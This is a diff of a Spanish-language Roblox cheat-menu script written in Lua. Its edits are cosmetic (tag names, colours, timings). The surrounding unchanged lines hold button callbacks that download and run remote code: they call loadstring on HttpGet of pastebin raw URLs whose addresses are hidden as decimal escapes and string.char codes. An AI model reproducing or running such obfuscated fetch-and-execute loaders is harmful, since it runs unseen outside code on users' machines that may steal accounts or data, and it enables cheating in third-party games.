@@ -175,15 +175,15 @@ _w1:Tag({
 })
 
 _w1:Tag({
-    Title = "extensiones",
+    Title = "Cargar emotes",
     Icon = "lucide:panda",
-    Color = Color3.fromHex("#8c00ff"),
+    Color=Color3.fromRGB(255,165,0),
     Border = true
 })
 -- HACER LOS TAGS CLICKEABLES (con hover + touch + pointer)
 -- ==========================================
 task.spawn(function()
-    task.wait(1.5)
+    task.wait(1.6)
     local uiContainer = GetSecureContainer()
     local _handlers = {
         ["defensas"]    = _onDefensasClick,
@@ -341,7 +341,7 @@ _tb3:Button({Title="💥gema de la realidad",Desc="altera la realidad te cambia 
 _tb3:Button({Title="🛩️HS Flayers",Desc="pa ke vuelen alto mis panas esto funciona en otros juegos también",Color=Color3.fromRGB(37,122,247),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\85\65\88\103\65\112\89\89"))() end})
 _tb3:Button({Title="👻invisibles y otras variantes 👻💥",Desc="es una mini biblioteca que contiene variantes de invisible",Color=Color3.fromRGB(255,255,0),Callback=function() local _g,_l=game,loadstring;local _u=string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,104,109,101,97,84,68,53,67);_l(_g:HttpGet(_u))() end})
 -- DETECTOR DE DESTRUCCIÓN SEGURO (LIMPIEZA TOTAL AL USAR LA 'X')
--- =====================================================================
+-- ==========================================
 task.spawn(function()
     task.wait(2)
 
